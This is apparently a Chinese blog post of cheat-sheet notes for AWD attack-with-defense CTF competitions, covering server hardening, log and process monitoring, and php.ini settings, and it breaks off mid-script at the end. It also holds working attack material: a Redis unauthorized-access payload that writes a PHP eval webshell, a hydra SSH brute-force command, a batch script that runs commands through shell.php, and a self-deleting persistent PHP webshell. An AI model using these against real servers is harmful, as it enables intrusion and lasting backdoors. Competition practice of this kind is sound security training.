{"title":"AWD详解","uid":"5deac5f75bb01e022a6aa8151fb3a9dd","slug":"AWD","date":"2022-11-14T22:34:21.000Z","updated":"2023-11-06T05:38:40.295Z","comments":true,"path":"api/articles/AWD.json","keywords":null,"cover":"https://cover.png","content":"<h1 id=\"AWD\"><a href=\"#AWD\" class=\"headerlink\" title=\"AWD\"></a>AWD</h1><p>AWD最主要的就是手速！！！ 同时队伍分配一定要合理，密码一定第一时间改掉，修改完配置文件一定记得重启使之生效。</p>\n<h2 id=\"连接SSH\"><a href=\"#连接SSH\" class=\"headerlink\" title=\"连接SSH\"></a>连接SSH</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">ssh-copy-id</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-i</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">~/.ssh/id_rsa.pub</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">root@xx.xx.xx.xx</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ssh</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">root@xx.xx.xx.xx</span></span></code></pre></div><h2 id=\"改密码\"><a href=\"#改密码\" class=\"headerlink\" title=\"改密码\"></a>改密码</h2><p><strong>ssh</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">passwd</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">root</span></span></code></pre></div><p><strong>网站</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">登录网站后台（普遍是弱口令，如果不是去数据库翻一下）然后改密码</span></span></code></pre></div><p><strong>mysql</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">SET</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">PASSWORD</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">FOR</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">root@localhost</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">PASSWORD</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">&#39;123456&#39;</span><span style=\"color: #89DDFF\">);</span></span></code></pre></div><h2 id=\"查看进程\"><a href=\"#查看进程\" class=\"headerlink\" title=\"查看进程\"></a>查看进程</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">netstat</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-tpnl </span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ps</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-df</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">top</span></span></code></pre></div><h2 id=\"杀死进程\"><a href=\"#杀死进程\" class=\"headerlink\" title=\"杀死进程\"></a>杀死进程</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #82AAFF\">kill</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-9</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">PID</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">killall</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">名称</span></span></code></pre></div><p>如果杀不掉，就查看父进程，杀掉父进程，如果还不行继续往上查 删掉木马文件，重新杀进程</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">ps</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-ef</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">|</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">grep</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3045</span></span></code></pre></div><p>如果进程不允许关闭 可以用 <code>nc</code> 监听一个端口，达到欺骗目的</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">nc</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-lv</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">6666</span></span></code></pre></div><h2 id=\"扫描端口\"><a href=\"#扫描端口\" class=\"headerlink\" title=\"扫描端口\"></a>扫描端口</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">nmap</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-sn</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xx.xx.xx.0/24</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">nmap</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-sV</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-Pn</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-n</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-v</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--open</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">xx.xx.xx.0/24</span></span></code></pre></div><h2 id=\"流量监控\"><a href=\"#流量监控\" class=\"headerlink\" title=\"流量监控\"></a>流量监控</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">tcpdump</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">tcp</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-i</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">eth0</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-t</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-s</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">and</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dst</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">port</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">!</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">22</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">and</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">src</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">net</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">192.168</span><span style=\"color: #C3E88D\">.1.0/24</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-w</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">./target.cap</span></span></code></pre></div><h2 id=\"备份网站\"><a href=\"#备份网站\" class=\"headerlink\" title=\"备份网站\"></a>备份网站</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">tar</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-zcvf</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">web.tar.gz</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/var/www/html</span></span></code></pre></div><h2 id=\"备份数据库\"><a href=\"#备份数据库\" class=\"headerlink\" title=\"备份数据库\"></a>备份数据库</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">mysqldump</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-uroot</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--databases</span><span style=\"color: #BABED8\"> [dbname] </span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> /tmp/db.sql</span></span></code></pre></div><h2 id=\"find命令\"><a href=\"#find命令\" class=\"headerlink\" title=\"find命令\"></a>find命令</h2><p><strong>查找行数最短的文件</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">find ./ -name </span><span style=\"color: #FFCB6B\">&#39;*.php&#39;</span><span style=\"color: #FFCB6B\"> </span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\"> xargs wc -l </span><span style=\"color: #89DDFF\">|</span><span style=\"color: #FFCB6B\"> sort -u</span></span></code></pre></div><p><strong>查找最近20分钟修改过的文件</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">find</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/var/www/html</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-name</span><span style=\"color: #BABED8\"> </span><span style=\"color: #BABED8\">*</span><span style=\"color: #C3E88D\">.php</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-mmin</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-20</span></span></code></pre></div><p><strong>查找危险函数</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">find</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">.</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-name</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">*.php</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">|</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">xargs</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">grep</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-n</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">eval(</span><span style=\"color: #89DDFF\">&#39;</span></span></code></pre></div><h2 id=\"开启日志\"><a href=\"#开启日志\" class=\"headerlink\" title=\"开启日志\"></a>开启日志</h2><p>日志功能在 <code>/etc/httpd/conf</code> 目录有个 <code>httpd.conf</code> 直接 <code>vi/vim</code> 编辑器打开用 <code>/</code> 搜索 <code>access.log</code></p>\n<p>这俩前面如果有 <code>#</code> 删掉 <code>#</code> 然后保存退出</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">CustomLog</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">logs/access.log</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">combined</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">CustomLog</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">logs/access.log</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">common</span></span></code></pre></div><p><code>access.log</code> 显示 <code>POST</code> 请求传参</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># LoadModule dumpio_module modules/mod_dumpio.so</span></span></code></pre></div><p>然后重启 <code>Apache</code>，使修改的配置文件生效</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">systemctl</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">restart</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">httpd</span></span></code></pre></div><p>然后直接 <code>实时</code> 查看 <code>access.log</code> 文件的 <code>新增</code> 内容</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">tail</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">access.log</span></span></code></pre></div><p>使用-f参数时不会中断文件监视，需要通过ctrl+c手动结束。</p>\n<h2 id=\"php-ini\"><a href=\"#php-ini\" class=\"headerlink\" title=\"php.ini\"></a>php.ini</h2><p>一般来说文件都在 <code>/etc/php.ini</code></p>\n<p><strong>在不影响正常功能的情况下 <code>禁用</code> 危险函数</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">disable_functions</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo</span></span></code></pre></div><p><strong>预防SQL注入</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">magic_quotes_gpc</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">on</span></span></code></pre></div><p><strong>修复远程文件包含</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">allow_url_fopen</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">off</span><span style=\"color: #BABED8\">  </span><span style=\"color: #C3E88D\">（是否允许打开远程文件）</span><span style=\"color: #BABED8\">  </span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">allow_url_include</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">off（是否允许include/require远程文件）</span></span></code></pre></div><p>切记修改完配置文件<strong>重启</strong></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">service</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">php-fpm</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">restart</span></span></code></pre></div><h2 id=\"PHP读取函数\"><a href=\"#PHP读取函数\" class=\"headerlink\" title=\"PHP读取函数\"></a>PHP读取函数</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #82AAFF\">file_get_contents</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">highlight_file</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">fopen</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">readfile</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">fread</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">fgetss</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">fgets</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">parse_ini_file</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">show_source</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">file</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">-----------------------------------</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">var_dump(scandir(</span><span style=\"color: #FFCB6B\">&#39;/&#39;</span><span style=\"color: #BABED8\">))</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span></span></code></pre></div><h2 id=\"文件包含修复\"><a href=\"#文件包含修复\" class=\"headerlink\" title=\"文件包含修复\"></a>文件包含修复</h2><p>直接把它目录限制死在 <code>/var/www/html</code></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">int_set(</span><span style=\"color: #FFCB6B\">&quot;open_basedir&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #FFCB6B\">&quot;/var/www/html&quot;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span></code></pre></div><h2 id=\"Redis未授权\"><a href=\"#Redis未授权\" class=\"headerlink\" title=\"Redis未授权\"></a>Redis未授权</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dir</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">path</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">feiye</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">\\n\\n\\n&lt;?php eval(</span><span style=\"color: #BABED8\">$_POST</span><span style=\"color: #C3E88D\">[&#39;cmd&#39;]);?&gt;\\n\\n\\n</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">config</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dbfilename</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">service.php</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">save</span></span></code></pre></div><h2 id=\"批量SSH链接\"><a href=\"#批量SSH链接\" class=\"headerlink\" title=\"批量SSH链接\"></a>批量SSH链接</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">hydra</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-l</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">root</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dcn</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ip.txt</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ssh</span></span></code></pre></div><h2 id=\"批量攻击脚本\"><a href=\"#批量攻击脚本\" class=\"headerlink\" title=\"批量攻击脚本\"></a>批量攻击脚本</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">requests</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">re</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">url</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">[]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">flag</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">[]</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> i </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> range</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">101,151</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">url.append(</span><span style=\"color: #FFCB6B\">&quot;http://10.0.0./&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">str</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">i</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> x </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> url:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">postdata</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&#123;</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">cmd</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">:</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">system(&#39;cat+/var/www/html/flag&#39;)</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">sussess</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">requests.post</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">x+</span><span style=\"color: #FFCB6B\">&quot;shell.php&quot;</span><span style=\"color: #FFCB6B\">,data</span><span style=\"color: #BABED8\">=postdata</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">&#39;flag&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">sussess.content:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">flag.append(re.search(</span><span style=\"color: #FFCB6B\">&quot;flag&#123;.*&#125;&quot;</span><span style=\"color: #FFCB6B\">,sussess.content</span><span style=\"color: #BABED8\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\">(flag)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    else:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\">(x+</span><span style=\"color: #FFCB6B\">&quot;: failed&quot;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> f </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> flag:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    inflag</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">requests.get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">&quot;domain.com/flag.php?token=token&amp;flag=&quot;</span><span style=\"color: #FFCB6B\">+f</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><h2 id=\"不死马\"><a href=\"#不死马\" class=\"headerlink\" title=\"不死马\"></a>不死马</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">set_time_limit(0</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ignore_user_abort(true</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">unlink(__FILE__</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">while</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">true</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">file_put_contents(</span><span style=\"color: #FFCB6B\">&#39;.shell.php&#39;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">&lt;?php @eval($_POST[cmd]);</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">usleep(100</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">?&gt;</span></span></code></pre></div><h2 id=\"删除不死马\"><a href=\"#删除不死马\" class=\"headerlink\" title=\"删除不死马\"></a>删除不死马</h2><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#!/bin/bash</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">dire</span><span style=\"color: #89DDFF\">=</span><span style=\"color: 